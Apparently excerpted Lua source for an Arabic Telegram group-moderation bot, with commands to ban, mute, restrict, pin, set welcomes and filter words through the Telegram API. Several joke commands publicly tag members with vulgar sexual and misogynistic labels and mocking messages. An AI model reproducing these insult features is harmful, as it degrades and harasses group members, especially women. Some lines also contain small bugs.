tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤗 الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'FA9SH')..')'
local statuss = '\n 𖤗 تم رفع رقاصه في الجروب\n 𖤗 مبقتش شريفه لا اله الي الله'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤗 الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'FA9SH')..')'
status = '\n 𖤗 تم تنزيل رقاصه من الجروب\n 𖤗 بقت شريفه لا اله الي الله'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
send(msg.chat_id_, msg.id_, ' 𖤗 تم تنزيل جميع جريزي')
end
if text == ("تاك للمتناكين") and Mod(msg) then
local list = database:smembers(bot_id..'Jred:User'..msg.chat_id_)
t = "\n 𖤗 قائمة المتناكين الجروب \n◤━───━❲𝐒𝐀𝐃❳━───━◥\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤗 الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'FA9SH')..')'
local statuss = '\n 𖤗 تم رفع الـعـضو  علي زبك بنجاح\n 𖤗 تفضل ابدا نيك'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖤗 تم مسح كل الحكاكين')
end
if text == ("تاك للحكاكين") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n 𖤗 قائمة حكاكين الجروب \n◤━───━❲𝐒𝐀𝐃❳━───━◥\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤗 الـعـضو  ⤌ ['..data.first_name_..'](t.me/'..(data.username_ or 's_o_op')..')'
local  statuss  = '\n 𖤗 تم رفع حكاك في الجروب\n 𖤗 احمرت ولا لسا'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤗 الـعـضو  ⤌ ['..data.first_name_..'](t.me/'..(data.username_ or 's_o_op')..')'
status  = '\n 𖤗 تم تنزيل حكاك من الجروب\n 𖤗 لا يسطت هيفضل حكاك رسمي'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
database:del(bot_id..'Girl:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖤗 تم مسح كل النسوان بالجروب')
end
if text == ("تاك للنسوان") and Mod(msg) then
local list = database:smembers(bot_id..'Girl:User'..msg.chat_id_)
t = "\n 𖤗 قائمة نسوان الجروب \n◤━───━❲𝐒𝐀𝐃❳━───━◥\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤗 الـعـضو  ⤌ ['..data.first_name_..'](t.me/'..(data.username_ or 's_o_op')..')'
local  statuss  = '\n 𖤗 تم رفع مره في الجروب\n 𖤗 ها صرتي من نسواني تعي ندخل'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤗 الـعـضو  ⤌ ['..data.first_name_..'](t.me/'..(data.username_ or 's_o_op')..')'
status  = '\n 𖤗 تم تنزيل مره من الجروب\n 𖤗 بتاعي غضبان عليكي ليوم الدين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
database:del(bot_id..'Mode:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖤗 تم مسح جميع المتزوجين')
end
if text == ("تاك للمتزوجين") and Mod(msg) then
local list = database:smembers(bot_id..'Mode:User'..msg.chat_id_)
t = "\n 𖤗 قائمه ازواج الجروب \n◤━───━❲𝐒𝐀𝐃❳━───━◥\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤗 العضــو ⤌ ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n 𖤗 تم زواجكم بنجاح في الجروب \n 𖤗 الطلاق امتي عشان ابقي موجود '
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
database:srem(bot_id..'Mode:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤗 العضــو ⤌ ['..data.first_name_..'](t.me/'..(data.username_ or 's_o_op')..')'
status  = '\n 𖤗 تم طلاقكم بنجاح في الجروب\n 𖤗 اوجعو تاني ونبي'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖤗 تم تعطيل القتل') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
...
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖤗 تم تعطيل الحظر') 
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " 𖤗 لا تسطيع حظر البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n 𖤗 عذرا لا تستطيع حظر ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
...
if result.id_ then
if Can_or_NotCan(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n 𖤗 عذرا لا تستطيع حظر ( '..Rutba(result.id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," 𖤗 عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
...
usertext = '\n 𖤗  المستخدم  ⇇['..result.title_..'](t.me/'..(username or 'GLOBLA')..')'
status  = '\n 𖤗 تم حظره'
texts = usertext..status
chat_kick(msg.chat_id_, result.id_)
send(msg.chat_id_, msg.id_, texts)
...
if Can_or_NotCan(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n 𖤗 عذرا لا تستطيع حظر ( '..Rutba(userid,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,' 𖤗 ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
...
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, ' 𖤗 انا لست محظورآ \n') 
return false 
end
...
send(msg.chat_id_, msg.id_, ' 𖤗 تم مسح المكتومين')
end
...
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " 𖤗 لا تسطيع كتم البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n 𖤗 عذرا لا تستطيع كتم ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' 𖤗 البوت ليس ادمن يرجى ترقيتي !') 
return false  
...
if Can_or_NotCan(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n 𖤗 عذرا لا تستطيع كتم ( '..Rutba(result.id_,msg.chat_id_)..' )')
else
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," 𖤗 عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
...
usertext = '\n 𖤗 الـعـضو   ⇇['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖤗 تم كتم لمدة ~ { '..TextEnd[2]..' '..TextEnd[3]..'}'
texts = usertext..status
send(msg.chat_id_, msg.id_,texts)
...
if Can_or_NotCan(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n 𖤗 عذرا لا تستطيع كتم ( '..Rutba(userid,msg.chat_id_)..' )')
else
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' 𖤗 البوت ليس ادمن يرجى ترقيتي !') 
return false  
...
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " 𖤗 لا تسطيع تقيد البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, '\n 𖤗 عذرا لا تستطيع تقيد ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
...
if Can_or_NotCan(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, '\n 𖤗 عذرا لا تستطيع تقيد ( '..Rutba(result.id_,msg.chat_id_)..' )')
return false 
end      
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤗 الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖤗 تم تقيده لمدة ~ { '..TextEnd[2]..' '..TextEnd[3]..'}'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+Time))
end
...
send(msg.chat_id_, msg.id_, '\n 𖤗 عذرا لا تستطيع تقيد ( '..Rutba(userid,msg.chat_id_)..' )')
else
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤗  الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖤗  الايدي  ⇇`'..result.sender_user_id_..'`\n 𖤗  تم رفعه مشرف '
send(msg.chat_id_, msg.id_, usertext..status)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤗  الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖤗  الايدي  ⇇`'..result.sender_user_id_..'`\n 𖤗  تم تنزيله ادمن من الجروب بكل الصلاحيات'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
end,nil)
end
...
usertext = '\n 𖤗  الـعـضو   ⇇['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖤗  تم تنزيله مشرف من الجروب بكل الصلاحيات'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
else
...
local text = 
'\n❲[`sᴏᴜʀᴄᴇ sᴀɪᴅɪ´](t.me/FA9SH)❳'..
'\n◤━━─⊶🚀𝑭𝑨𝑺𝑻𝑬𝑹🚀⊷─━─◥'..
'\n 𖤗 اعدادات الجروب كتالي ☆'..
'\nء◤━━─⊶🚀𝑭𝑨𝑺𝑻𝑬𝑹🚀⊷─━─◥'..
'\n 𖤗  علامة ال {✓} تعني مفعل'..
'\n 𖤗  علامة ال {✘} تعني معطل'..
'\nء◤━━─⊶🚀𝑭𝑨𝑺𝑻𝑬𝑹🚀⊷─━─◥'..
'\n 𖤗  الروابط  ⇇{ '..lock_links..
' }\n'..' 𖤗  المعرفات  ⇇{ '..lock_user..
' }\n'..' 𖤗  التاك  ⇇{ '..lock_hash..
' }\n'..' 𖤗  البوتات  ⇇{ '..lock_bots..
' }\n'..' 𖤗  التوجيه  ⇇{ '..lock_fwd..
' }\n'..' 𖤗  التثبيت  ⇇{ '..lock_pin..
' }\n'..' 𖤗  الاشعارات  ⇇{ '..lock_tagservr..
' }\n'..' 𖤗  الماركدون  ⇇{ '..lock_mark..
' }\n'..' 𖤗  التعديل  ⇇{ '..lock_edit..
' }\n'..' 𖤗  تعديل الميديا  ⇇{ '..lock_edit_med..
' }\nء◤━━─⊶🚀𝑭𝑨𝑺𝑻𝑬𝑹🚀⊷─━─◥'..
'\n'..' 𖤗  الكلايش  ⇇{ '..lock_spam..
' }\n'..' 𖤗  الكيبورد  ⇇{ '..lock_inlin..
' }\n'..' 𖤗  الاغاني  ⇇{ '..lock_vico..
' }\n'..' 𖤗  المتحركه  ⇇{ '..lock_gif..
' }\n'..' 𖤗  الملفات  ⇇{ '..lock_file..
' }\n'..' 𖤗  الدردشه  ⇇{ '..lock_text..
...
' }\n'..' 𖤗  التكرار  ⇇{ '..flood..
' }\n'..' 𖤗  الترحيب  ⇇{ '..welcome..
' }\n'..' 𖤗  عدد التكرار  ⇇{ '..NUM_MSG_MAX..
' }\nء⧬━┅┅┄⟞❲[᪣𝚁𝙰𝙼𝙱𝙾᪣](t.me/FA9SH)❳⟝┄┉┉━⧬'..
'\n 𖤗  علامة ال {✓} تعني مفعل'..
'\n 𖤗  علامة ال {✘} تعني معطل'..
'\nء◤━━─⊶🚀𝑭𝑨𝑺𝑻𝑬𝑹🚀⊷─━─◥'..
'\n'..' 𖤗  امر صيح  ⇇{ '..kickme..
' }\n'..' 𖤗  امر اطردني  ⇇{ '..sehuser..
' }\n'..' 𖤗  امر منو ضافني  ⇇{ '..addme..
' }\n'..' 𖤗  الردود  ⇇{ '..rdmder..
' }\n'..' 𖤗  الردود العامه  ⇇{ '..rdsudo..
' }\n'..' 𖤗  الايدي  ⇇{ '..idgp..
' }\n'..' 𖤗  الايدي بالصوره  ⇇{ '..idph..
' }\n'..' 𖤗  الرفع  ⇇{ '..setadd..
' }\n'..' 𖤗  الحظر  ⇇{ '..banm..' }\n\n 𖤗 ═───═❲[`sᴏᴜʀᴄᴇ sᴀɪᴅɪ´](t.me/FA9SH)❳═───═ 𖤗 \n 𖤗 قناة سورس فاستر◤━━─⊶🚀𝑭𝑨𝑺𝑻𝑬𝑹🚀⊷─━─◥\n [ ❲[`sᴏᴜʀᴄᴇ sᴀɪᴅɪ´](t.me/FA9SH)❳](t.me/FA9SH) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
send(msg.chat_id_,msg.id_," 𖤗 عذرآ تم قفل التثبيت")  
return false  
end
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.reply_to_message_id_,disable_notification_ = 1},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_," 𖤗 تم تثبيت الرساله")   
database:set(bot_id..'Pin:Id:Msg'..msg.chat_id_,msg.reply_to_message_id_)
elseif data.code_ == 6 then
send(msg.chat_id_,msg.id_," 𖤗 انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
elseif data.message_ == "CHAT_NOT_MODIFIED" then
send(msg.chat_id_,msg.id_," 𖤗 لا توجد رساله مثبته")  
elseif data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_," 𖤗 ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
end
end,nil) 
end
...
if database:sismember(bot_id..'lock:pin',msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_,msg.id_," 𖤗 عذرآ تم قفل الثبيت")  
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_," 𖤗 تم الغاء تثبيت الرساله")   
...
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_," 𖤗 تم الغاء تثبيت الكل")   
...
send(msg.chat_id_, msg.id_, t..'⩹━━━━⊶❲?? 𝐒𝐀𝐃 𖥳❳⊷━━━━⩺\nاضغط علي الاسم ليتم نسخه\n◤━━─⊶🚀𝑭𝑨𝑺𝑻𝑬𝑹🚀⊷─━─◥ٴ\n ☾ ❲[𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐀𝐃](t.me/FA9SH)❳ 𖤗 ')
end
...
send(msg.chat_id_,msg.id_," 𖤗 حسنآ ارسل اليه الرابط الان")
...
if Constructor(msg) then  
database:set(bot_id.."my_photo:status"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_," 𖤗 تم تفعيل الصوره") 
return false  
end
end
...
if Constructor(msg) then  
database:del(bot_id.."my_photo:status"..msg.chat_id_) 
send(msg.chat_id_, msg.id_," 𖤗 تم تعطيل الصوره") 
return false end
end
if text == "تفعيل نسبه جمالي" or text == 'تفعيل جمالي' then
if Constructor(msg) then  
database:set(bot_id.."pp_photo:status"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_," 𖤗 تم تفعيل نسبه جمالك") 
return false  
end
end
...
if Constructor(msg) then  
database:del(bot_id.."pp_photo:status"..msg.chat_id_) 
send(msg.chat_id_, msg.id_," 𖤗 تم تعطيل نسبه جمالك") 
return false end
end
if text == "الرابط" then 
...
if linkgpp.ok == true then 
local Teext = ' 𖤗 '..ta.title_..'\n'..linkgpp.result 
local inline = {{{text = ta.title_, url=linkgpp.result}},} 
send_inline_key(msg.chat_id_,Teext,nil,inline,msg.id_/2097152/0.5) 
else 
send(msg.chat_id_, msg.id_,' 𖤗 لا يوجد رابط ارسل ضع رابط') 
end 
end,nil) 
end
...
send(msg.chat_id_,msg.id_," 𖤗 تم مسح الرابط")           
...
send(msg.chat_id_, msg.id_,' 𖤗 ارسل لي الصوره') 
return false
end
...
send(msg.chat_id_, msg.id_,' 𖤗 تم ازالة صورة الجروب') 
end
return false  
end
...
send(msg.chat_id_, msg.id_,' 𖤗 ارسل الان الوصف')
end
return false  
end
...
t  = ' 𖤗 ارسل لي الترحيب الان'
tt = '\n 𖤗 تستطيع اضافة مايلي !\n 𖤗 دالة عرض الاسم  ⤌{`name`}\n 𖤗 دالة عرض المعرف  ⤌{`user`}'
...
GetWelcome = ' 𖤗 لم يتم تعيين ترحيب للكروب'
end 
...
Text = ' * 𖤗 تم تفعيل التحقق عند دخول الاعضاء*'
else
Text = ' * 𖤗 بالتاكيد تم تفعيل التحقق*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل التحقق' and Manager(msg) then  
if not database:get(bot_id..'CAPTCHA'..msg.chat_id_) then
Text = '\n * 𖤗 بالتاكيد تم تعطيل التحقق*'
else
database:del(bot_id.."CAPTCHA"..msg.chat_id_) 
Text = '\n * 𖤗 تم تعطيل التحقق عند دخول الاعضاء*'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
send(msg.chat_id_, msg.id_,' 𖤗 تم تفعيل ترحيب الجروب') 
return false  
end
...
database:del(bot_id..'Chek:Welcome'..msg.chat_id_) 
send(msg.chat_id_, msg.id_,' 𖤗 تم تعطيل ترحيب الجروب') 
return false  
end
if text == 'مسح الترحيب' or text == 'مسح الترحيب' then 
if Mod(msg) then
database:del(bot_id..'Get:Welcome:Group'..msg.chat_id_) 
send(msg.chat_id_, msg.id_,' 𖤗 تم ازالة ترحيب الجروب') 
end
end
if text and text == "منع" and msg.reply_to_message_id_ == 0 and Manager(msg)  then       
send(msg.chat_id_, msg.id_," 𖤗 ارسل الكلمه لمنعها")  
...
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," 𖤗 ارسل التحذير عند ارسال الكلمه")  
...
if test == "repp" then  
send(msg.chat_id_, msg.id_," 𖤗 تم منع الكلمه مع التحذير")  
...
send(msg.chat_id_, msg.id_," 𖤗 ارسل الكلمه الان")  
database:set(bot_id.."DRAGON1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."DRAGON1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test and test == "reppp" then   
send(msg.chat_id_, msg.id_," 𖤗 تم الغاء منعها")  
database:del(bot_id.."DRAGON1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
send(msg.chat_id_, msg.id_," 𖤗 تم مسح قائمه المنع")  
end
...
send(msg.chat_id_,msg.id_,' 𖤗 تم الغاء حفظ كليشة المطور')
return false
end
database:set(bot_id..'TEXT_SUDO',text)
database:del(bot_id..'Set:TEXT_SUDO'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,' 𖤗 تم حفظ كليشة المطور')
return false
end
-----------------
...
send(msg.chat_id_, msg.id_, ' 𖤗 تم ازالة كليشة الايدي')
end
return false  
end 
...
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_," 𖤗 تم الغاء تعين الايدي") 
...
send(msg.chat_id_, msg.id_,' 𖤗 تم تعين الايدي')    
end
...
if (c - x) == 0 then
send(msg.chat_id_, msg.id_, " 𖤗 لا توجد بوتات في الجروب")
else
local t = ' 𖤗 عدد البوتات هنا >> {'..c..'}\n 𖤗 عدد البوتات التي هي ادمن >> {'..x..'}\n 𖤗 تم طرد >> {'..(c - x)..'} من البوتات'
send(msg.chat_id_, msg.id_,t) 
end 
end,nil)  
end   
...
if #admins == i then 
local a = '\n◤━━─⊶🚀𝑭𝑨𝑺𝑻𝑬𝑹🚀⊷─━─◥\n 𖤗 عدد البوتات التي هنا >> {'..n..'} بوت\n'
local f = ' 𖤗 عدد البوتات التي هي ادمن >> {'..t..'}\n 𖤗 ملاحضه علامة ال ( 𖤗 ) تعني ان البوت ادمن \n'
...
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_, " 𖤗 تم الغاء حفظ القوانين") 
database:del(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
return false  
end 
database:set(bot_id.."Set:Rules:Group" .. msg.chat_id_,text) 
send(msg.chat_id_, msg.id_," 𖤗 تم حفظ قوانين الجروب") 
database:del(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
end  
...
send(msg.chat_id_,msg.id_," 𖤗 ارسل لي القوانين الان")  
end
end
if text == 'مسح القوانين' or text == 'مسح القوانين' then  
if Mod(msg) then
send(msg.chat_id_, msg.id_," 𖤗 تم ازالة قوانين الجروب")  
...
send(msg.chat_id_, msg.id_," 𖤗 لا توجد قوانين")   
end    
end
...
send(msg.chat_id_, msg.id_,' 𖤗 تم طرد المحذوفين')
end,nil)
end
end
...
if #list == 0 then
send(msg.chat_id_, msg.id_,' 𖤗 لا توجد صلاحيات مضافه')
return false
end
t = "\n 𖤗 قائمة الصلاحيات المضافه \n◤━━─⊶🚀𝑭𝑨𝑺𝑻𝑬𝑹🚀⊷─━─◥\n"
for k,v in pairs(list) do
...
send(msg.chat_id_, msg.id_, " 𖤗 ارسل نوع الرتبه \n 𖤗 {عـضـو -- ممـيـز -- ادمـن -- مـديـر}") 
end
...
send(msg.chat_id_, msg.id_, "* 𖤗 تم مسح الصلاحيه *\n") 
end
...
if text == 'مدير' then
if not Constructor(msg) then
send(msg.chat_id_, msg.id_"* 𖤗 تستطيع اضافه صلاحيات {ادمن - مميز - عضو} \n 𖤗 ارسل الصلاحيه مجددا*\n") 
return false
end
end
if text == 'ادمن' then
if not Manager(msg) then 
send(msg.chat_id_, msg.id_,"* 𖤗 تستطيع اضافه صلاحيات {مميز - عضو} \n 𖤗 ارسل الصلاحيه مجددا*\n") 
return false
end
end
if text == 'مميز' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,"* 𖤗  تستطيع اضافه صلاحيات {عضو} \n 𖤗 ارسل الصلاحيه مجددا*\n") 
return false
end
end
...
send(msg.chat_id_, msg.id_, " 𖤗 تـم اضـافـه الامـر") 
database:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
end
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n 𖤗 الـعـضو   ⇇['..result.title_..'](t.me/'..(text1[3] or 'textchuser')..')'..'\n 𖤗 تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
send(msg.chat_id_, msg.id_,' 𖤗 تم مسح رسائلك'  )  
...
send(msg.chat_id_, msg.id_,' 𖤗 عدد رسائلك  ⇇{ '..database:get(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_)..'}' ) 
end 
...
if num > 1500 then 
send(msg.chat_id_, msg.id_,' 𖤗 تستطيع التنظيف 1500 رساله كحد اقصى') 
return false  
end  
local msgm = msg.id_
for i=1,tonumber(num) do
...
send(msg.chat_id_,msg.id_,' 𖤗 تم مسح {'..num..'}')  
...
send(msg.chat_id_, msg.id_," 𖤗 تم تنظيف جميع الميديا")
end
...
local Message = v
if Message then
t = " 𖤗 تم مسح "..k.." من الوسائط الموجوده"
DeleteMessage(msg.chat_id_,{[0]=Message})
database:del(bot_id.."S00F4:allM"..msg.chat_id_)
end
end
if #list == 0 then
t = " 𖤗 لا يوجد ميديا في المجموعه"
end
send(msg.chat_id_, msg.id_, t)
end
...
local numl = v
if numl then
l = " 𖤗 عدد الميديا الموجود هو "..k
end
end
if #num == 0 then
l = " 𖤗 لا يوجد ميديا في المجموعه"
end
...
send(msg.chat_id_, msg.id_,' 𖤗 تم تنظيف جميع الرسائل المعدله')
end
...
database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_," 𖤗 ارسل لي الاسم الان ")  
end
return false
end
if msg.content_.ID == "MessageChatJoinByLink" then
...
send(msg.chat_id_, msg.id_," الاذاعه معطله من قبل المطور الاساسي 𖤗 ")
return false
end
...
send(msg.chat_id_, msg.id_,' 𖤗 الاذاعه معطله من قبل المطور الاساسي')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
...
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_," 𖤗 ليست لدي صلاحية تغير اسم الجروب")  
else
sebd(msg.chat_id_,msg.id_,' 𖤗 تم تغيير اسم الجروب الى {[↝'..Name..'↜]}')  
end
end,nil) 
end
...
send(msg.chat_id_, msg.id_," 𖤗 لا تستطيع تنزيل المطور الاساسي")
return false 
end
...
send(msg.chat_id_, msg.id_,"\n 𖤗 تم تنزيل الشخص من الرتب التاليه \n 𖤗  { "..dev..""..crr..""..cr..""..own..""..mod..""..mn..""..vip.." } \n")
else
send(msg.chat_id_, msg.id_,"\n 𖤗  عذرا الـعـضو  لايملك رتبه \n")
end
...
send(msg.chat_id_, msg.id_," 𖤗 تم مسح الردود العامه")
end

if text == ("الردود العامه") and DevSoFi(msg) then 
local list = database:smembers(bot_id..'List:Rd:Sudo')
text = "\n 𖤗 قائمة الردود العامه \n⩹━━━━⊶❲ 𖤗  𝐒𝐀𝐈𝐃??  𖤗 ❳⊷━━━━⩺\n"
for k,v in pairs(list) do
...
send(msg.chat_id_, msg.id_,' 𖤗 تم حفظ الرد')
return false  
end  
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'Set:Rd↝'..msg.sender_user_id_..'↜:'..msg.chat_id_) == 'true' then
send(msg.chat_id_, msg.id_,' 𖤗 ارسل الرد الذي تريد اضافته')
...
